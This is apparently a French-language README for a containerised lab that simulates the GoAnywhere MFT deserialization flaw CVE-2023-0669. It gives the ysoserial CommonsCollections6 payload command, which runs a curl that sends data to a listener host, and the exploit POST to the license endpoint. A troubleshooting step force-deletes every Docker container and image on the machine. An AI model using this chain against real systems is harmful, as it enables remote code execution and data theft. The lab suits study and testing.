## Structure du projet
cve-2023-0669-simulation/
├── docker-compose.yml
├── attacker/
│   ├── Dockerfile
│   └── CVE_2023_0669_helper.java
├── vulnerable/
│   ├── Dockerfile
│   └── VulnerableServer.java
├── listener/
│   ├── Dockerfile
│   └── server.py
└── received/               ← créé automatiquement (exfiltration)



# 2. Démarre les 3 conteneurs (attaquant, vulnerable, listener)
docker-compose up --build 

###  Problème : erreur `KeyError: 'ContainerConfig'` lors de `docker compose up`

ce projet requiert :
- **Docker Engine : v24 ou v25 minimum**
- **Docker Compose : v2.20+** (inclus automatiquement avec Docker)
KeyError: 'ContainerConfig' lors de docker compose up Cela provient généralement de métadonnées Docker obsolètes ou corrompues, ou d'anciennes images.
Supprimer les conteneurs, images et métadonnées cassées :

docker compose down --remove-orphans

docker rm -f $(docker ps -aq)

docker rmi -f $(docker images -q)

Puis reconstruisez proprement : 

docker compose build --no-cache

docker compose up




# 3. Entre dans le conteneur de l’attaquant
docker exec -it attacker bash


# Génération du payload safe (envoie juste un message)```
java -jar ysoserial-all.jar CommonsCollections6 'curl -s http://listener:8080/receive -d "PWNED-CVE-2023-0669-simulation-$(date)"' > payload.ser

# Chiffrement du payload
java CVE_2023_0669_helper payload.ser 1
# → Copie toute la longue chaîne qui s’affiche (Ctrl+A puis Ctrl+C)

# Envoi de l’exploit (remplace LA_CHAINE par ce que tu viens de copier)
curl -X POST http://vulnerable:8001/goanywhere/lic/accept \
  -d "encryptedLicenseResponseData=LA_CHAÎNE_BASE64_ICI" \
  -d "acceptLicense=true"


### 7. Résultat immédiat

Tu verras dans les logs du listener (ou dans le dossier `./received` sur ton PC) :

PWNED ! Reçu 42 bytes → PWNED-CVE-2023-0669-simulation-Sat 06 Dec 2025...
